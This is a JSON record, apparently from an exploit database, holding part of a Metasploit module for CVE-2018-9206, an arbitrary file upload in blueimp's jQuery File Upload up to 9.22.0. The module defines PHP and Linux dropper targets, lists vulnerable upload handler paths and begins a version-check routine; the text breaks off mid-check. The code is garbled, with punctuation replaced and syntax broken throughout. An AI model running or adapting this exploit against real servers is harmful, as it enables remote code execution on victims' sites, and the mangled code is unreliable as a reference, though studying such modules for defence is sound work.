{
    "text": "vul_name : blueimps jQuery 9.22.0 ( Arbitrary ) File Upload ( Metasploit )  ， vul_cve : CVE-2018-9206 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : PhpEXE ， super ( update_info ( info ,  ， 'Name' => \"blueimp's jQuery ( Arbitrary ) File Upload\" ,  ， 'Description' => %q{ ， This module exploits an arbitrary file upload in the sample PHP upload ， handler for blueimp's jQuery File Upload widget in versions <= 9.22.0. ， Due to a default configuration in Apache 2.3.9+ , the widget's .htaccess ， file may be disabled , enabling exploitation of this vulnerability. ， This vulnerability has been exploited in the wild since at least 2015 ， and was publicly disclosed to the vendor in 2018. It has been present ， since the .htaccess change in Apache 2.3.9. ， This module provides a generic exploit against the jQuery widget. ， } ,  ， 'Author' => [  ， 'Claudio Viviani' ,  # WordPress Work the Flow ( Arbitrary ) File Upload ， 'Larry W. Cashdollar' ,  #  ( Re ) discovery , vendor disclosure , and PoC ， 'wvu' # Metasploit module ，  ]  ,  ， ' ，  [ 'CVE' , '2018-9206' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'DisclosureDate' => 'Oct 9 2018' ,  # Larry's disclosure to the vendor ， 'License' => MSF_LICENSE ,  ， 'Platform' => [ 'php' , 'linux' ]  ,  ， 'Arch' => [ ARCH_PHP , ARCH_X86 , ARCH_X64 ]  ,  ， 'Privileged' => false ,  ， 'Targets' => [  ，  [ 'PHP Dropper' , 'Platform' => 'php' , 'Arch' => ARCH_PHP ]  ,  ，  [ 'Linux Dropper' , 'Platform' => 'linux' , 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ，  ]  ,  ， 'DefaultTarget' => 0 ， register_options (  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'Base path' , '/jQuery-File-Upload' ]  )  ，  ]  )  ， end ， def version_paths ， %w [  ， /package.json ， /bower.json ，  ] .map { | u | normalize_uri ( target_uri.path , u ) } ， end ，  # List from PoC sorted by frequency ， def upload_paths ， %w [  ， /server/php/index.php ， /server/php/upload.class.php ， /server/php/UploadHandler.php ， /example/upload.php ， /php/index.php ，  ] .map { | u | normalize_uri ( target_uri.path , u ) } ， end ， def check ， a = nil ， version_paths.each do | u |  ， vprint_status ( \"Checking # {u}\" )  ， res = send_request_cgi (  ， 'method' => 'GET' ,  ， 'uri' => u ， next unless res ， unless a ， res.headers [ 'Server' ] = ~ /Apache\\/ (  [ \\d. ] + ) / ，  $ 1 ( a = Gem : Version.new (  $ 1 )  ， vprint_good ( \"Found Apache # {a} ( AllowOverride None may be set ) \" )  ， elsif a ， vprint_warning ( \"Found Apache # {a} ( AllowOverride All may be set ) \" )  ， end ， end ， next unless res.code = 200 ( j = res.get_json_document )  ， j [ 'version' ]  ( v = Gem : Version.new ( j [ 'version' ]  )  ， vprint_good ( \"Found unpatched jQuery File Upload # {v}\" ) ",
    "time": "2018.11.09"
}